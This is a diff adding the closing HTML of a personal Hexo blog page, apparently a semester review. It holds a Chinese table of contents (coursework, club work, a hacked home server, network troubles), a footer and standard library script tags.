+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%80%BB%E7%BB%93"><span class="toc-text">工作总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%91%E5%8D%8F"><span class="toc-text">科协</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%AF%E5%9F%BA%E6%9C%8D%E5%8A%A1%E9%98%9F"><span class="toc-text">柯基服务队</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E7%A9%BA%E5%B7%A5%E5%9C%BA"><span class="toc-text">天空工场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-text">学习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%BB%84"><span class="toc-text">进组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E4%BA%8B%E6%83%85"><span class="toc-text">乱七八糟的事情</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B8%9A"><span class="toc-text">学业</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OOP"><span class="toc-text">OOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%BB%E6%95%A3-2"><span class="toc-text">离散 (2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E7%BB%9F"><span class="toc-text">概统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E4%BB%A3%E9%80%89%E8%AE%B2"><span class="toc-text">高代选讲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%BA%E6%99%BA%E5%AF%BC"><span class="toc-text">人智导</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9F%BA%E7%A1%80"><span class="toc-text">图形学基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%9B%E6%A6%82-%E8%BF%99%E5%AD%A6%E6%9C%9F%E8%BF%99%E4%B9%88%E5%A4%9A%E8%AF%BE%E5%98%9B"><span class="toc-text">毛概 (这学期这么多课嘛)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%A0%E6%A6%82"><span class="toc-text">习概</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF"><span class="toc-text">数字逻辑电路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E5%AE%9E%E9%AA%8C"><span class="toc-text">数字逻辑实验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B"><span class="toc-text">软件工程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Harry-s-NUC-Got-Hacked-%E5%A4%84%E7%90%86%E5%AF%92%E5%81%87%E7%9A%84%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%8F%8A%E5%85%B6%E5%90%8E%E7%BB%AD"><span class="toc-text">Harry&#39;s NUC Got Hacked - 处理寒假的网络入侵事件及其后续</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E7%BA%BF%E6%BC%8F%E6%B4%9E-%E5%A6%82%E4%BD%95%E7%8E%A9%E5%9D%8F-Secoder"><span class="toc-text">下线漏洞 - 如何玩坏 Secoder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%9D%E5%AE%A4%E7%9A%84%E7%BD%91-AP-%E6%8E%89%E7%BA%BF%E4%B8%89%E8%BF%9B%E4%B8%89%E5%87%BA"><span class="toc-text">寝室的网 - AP 掉线三进三出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tsinghua-Secure-%E6%97%A0%E7%BA%BF%E6%8C%A4%E6%8E%89%E6%9C%89%E7%BA%BF"><span class="toc-text">Tsinghua-Secure - 无线挤掉有线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%BB%B4%E6%8A%A4-%E5%88%B6%E9%80%A0-Downtime-%E5%B0%8F%E8%83%BD%E6%89%8B"><span class="toc-text">服务维护 - 制造 Downtime 小能手</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A7%91%E6%9C%8D-%E6%80%8E%E4%B9%88%E6%88%91%E7%9A%84%E7%94%B5%E8%84%91-%E4%BB%8E%E6%9D%A5%E9%83%BD%E4%B8%8D%E4%BC%9A%E5%87%BA%E5%A5%87%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98-%E4%B9%9F%E8%83%BD%E5%87%BA%E5%A5%87%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">科服 - 怎么我的电脑 从来都不会出奇怪的问题 也能出奇怪的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A9%E7%A9%BA%E5%B7%A5%E5%9C%BA-%E4%B8%87%E5%85%86%E7%BD%91-%E9%A6%99"><span class="toc-text">天空工场 - 万兆网! 香!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BF%E8%88%8D%E8%BD%AF%E8%B7%AF%E7%94%B1-%E5%AE%BD%E5%B8%A6%E5%88%B0%E6%9C%9F%E4%BA%86-awa"><span class="toc-text">宿舍软路由 - 宽带到期了 awa</span></a></li></ol>
+    </div>
+  </aside>
+
+
+
+  
+
+
+        </div>
+      </main>
+      <footer class="footer syuanpi fadeIn" id="footer">
+  <hr>
+  <div class="footer-wrapper">
+    <div class="left">
+      <div class="contact-icon">
+  
+  
+    <a target="_blank" rel="noopener" href="https://github.com/84634E1A607A" class="iconfont icon-github" title="github"></a>
+  
+</div>
+
+    </div>
+    <div class="right">
+      <div class="copyright">
+    <div class="info">
+        <span>&copy;</span>
+        <span>2024 ~ 2024</span>
+        <span>❤</span>
+        <span>Ajax Dong</span>
+    </div>
+    <div class="theme">
+        <span>
+            Powered by
+            <a href="http://hexo.io/" target="_blank" rel="noopener">Hexo </a>
+        </span>
+        <span>
+            Theme
+            <a target="_blank" rel="noopener" href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
+        </span>
+    </div>
+    
+</div>
+
+    </div>
+  </div>
+</footer>
+    </div>
+    <div class="tagcloud" id="tagcloud">
+  <div class="tagcloud-taglist">
+  
+  </div>
+  
+</div>
+
+  </div>
+  <div class="backtop syuanpi melt toTop" id="backtop">
+    <i class="iconfont icon-up"></i>
+    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
+</div>
+
+  <div class="search" id="search">
+    <div class="input">
+      <input type="text" id="search-input" placeholder="Search something?" autofocus>
+    </div>
+    <div id="search-result"></div>
+  </div>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+
+
+  <script></script>
+  <script src="/script/lib/lightbox/js/lightbox.min.js" async></script>
+
+
+
+
+
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script>
+    MathJax = {
+      tex: {
+        tags: 'ams'
+      }
+    };
+  </script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+
+
+
+
+
+  
+<script src="/script/lib/pjax/pjax.js"></script>
+
+
+
+
+  
+<script src="/script/scheme/banderole.js"></script>
+
+
+
+
+<script src="/script/bootstarp.js"></script>
+
+
+
+<script>
+if (nlviconfig.theme.toc) {
+  setTimeout(function() {
+    if (nlviconfig.theme.scheme === 'balance') {
+      $("#header").addClass("show_toc");
+    } else if (nlviconfig.theme.scheme === 'banderole') {
+      $(".container-inner").addClass("has_toc");
+      $(".post-toc .title").addClass("show");
+      $(".toc-inner").addClass("show");
+    }
+  }, 1000);
+}
+</script>
+
+
+
+</body>
+</html>
